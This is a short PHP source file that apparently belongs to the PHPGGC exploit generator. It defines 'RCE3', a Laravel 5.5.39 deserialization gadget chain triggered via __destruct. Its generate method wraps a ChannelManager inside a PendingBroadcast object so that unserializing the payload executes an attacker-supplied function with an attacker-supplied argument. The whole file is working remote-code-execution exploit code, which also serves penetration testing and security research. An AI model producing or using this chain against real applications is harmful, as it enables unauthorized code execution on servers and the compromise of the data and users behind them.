<?php

namespace GadgetChain\Laravel;

class RCE3 extends \PHPGGC\GadgetChain\RCE
{
    public $version = '5.5.39';
    public $vector = '__destruct';
    public $author = 'BlackFan';
    public $informations = 'This chain triggers an ErrorException after code execution.';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Illuminate\Broadcasting\PendingBroadcast(
            new \Illuminate\Notifications\ChannelManager($function, $parameter) 
        );
    }
}
